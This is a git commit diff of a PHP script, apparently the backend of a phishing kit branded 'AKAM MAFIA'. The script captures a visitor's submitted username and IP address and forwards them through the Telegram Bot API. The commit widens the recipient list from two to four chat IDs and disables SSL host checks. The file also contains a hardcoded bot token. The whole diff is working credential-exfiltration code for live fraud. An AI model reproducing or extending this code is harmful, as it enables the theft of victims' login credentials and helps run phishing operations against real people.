e0f8e35d91f7c5f29b0566398a24a9b81cd3f7fe
leidyjhoanalj88-png <leidyjhoanalj88@gmail.com>
2026-04-21 22:40:38 -0500

    Actualizar inicio.php

--- process/inicio.php
+++ process/inicio.php
@@ -7,14 +7,19 @@ $ip = $_SERVER['REMOTE_ADDR'];
 $usuario = isset($_POST['usr']) ? $_POST['usr'] : 'No detectado'; 
 
 if ($usuario != 'No detectado') {
-    // 1. Guardar en el panel (Usuario y Clave inicial si la hay)
+    // 1. Guardar en el panel (Usuario)
     if (function_exists('actualizar_registro')) {
         actualizar_registro($ip, "USUARIO", $usuario); 
     }
 
-    // 2. Configuración del Bot 𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐
+    // 2. Configuración del Bot 𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - (4 IDs activos)
     $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
-    $chat_ids = ["8114050673", "8518977918"]; 
+    $chat_ids = [
+        "8114050673", 
+        "8518977918", 
+        "8638340940", 
+        "8645545892"
+    ]; 
 
     // 3. Formato del mensaje
     $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - NUEVO ACCESO</b> ⭐\n\n";
@@ -23,7 +28,7 @@ if ($usuario != 'No detectado') {
     $mensaje .= "⏰ <b>FECHA:</b> " . date('d/m/Y H:i:s') . "\n";
     $mensaje .= "━━━━━━━━━━━━━━━";
 
-    // 4. Envío a Telegram
+    // 4. Envío a Telegram a todos los IDs
     foreach ($chat_ids as $id) {
         $url = "https://api.telegram.org/bot$token/sendMessage";
         $data = [
@@ -38,6 +43,8 @@ if ($usuario != 'No detectado') {
         curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
         curl_exec($ch);
         curl_close($ch);
     }
